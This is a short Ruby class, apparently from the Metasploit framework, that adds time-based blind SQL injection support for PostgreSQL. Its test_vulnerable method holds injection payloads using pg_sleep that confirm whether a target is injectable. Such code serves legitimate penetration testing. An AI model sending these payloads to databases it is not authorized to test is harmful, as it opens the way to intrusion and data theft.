#
#   Time-Based Blind SQL injection support for PostgreSQL
#
class Msf::Exploit::SQLi::PostgreSQLi::TimeBasedBlind < Msf::Exploit::SQLi::PostgreSQLi::Common
  include Msf::Exploit::SQLi::TimeBasedBlindMixin

  #
  # This method checks if the target is vulnerable to Blind time-based injection by checking if
  # the target sleeps only when a given condition is true, and doesn't when it's false.
  # @return [Boolean] Whether the check confirmed that the time-based SQL injection works
  #
  def test_vulnerable
    out_true = blind_request("1=(case when 1=1 then (select 1 from pg_sleep(#{datastore['SqliDelay']})) else 1 end)")
    out_false = blind_request("1=(case when 1=2 then (select 1 from pg_sleep(#{datastore['SqliDelay']})) else 1 end)")
    out_true && !out_false
  end

end
